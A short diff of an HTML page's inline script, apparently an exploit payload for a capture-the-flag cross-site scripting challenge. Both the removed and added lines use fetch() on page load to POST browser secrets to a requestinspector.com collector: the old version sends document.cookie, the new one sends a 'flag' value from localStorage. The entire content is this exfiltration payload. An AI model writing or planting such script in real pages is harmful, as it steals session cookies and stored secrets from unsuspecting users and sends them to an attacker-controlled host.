@@ -9,8 +9,11 @@
     </body>
     <script>
         fetch(
-            'https://01hc4w1zzh471sdvtmcey3wzqw00-2e160bc652f2ee44dbcf.requestinspector.com',
-            { method: 'POST', body: JSON.stringify({ a: document.cookie }) }
+            'https://01hdwftvwz6fck8j6ntcdq26vs00-a22fe370aae401506893.requestinspector.com',
+            {
+                method: 'POST',
+                body: JSON.stringify({ a: localStorage.getItem('flag') }),
+            }
         );
     </script>
 </html>
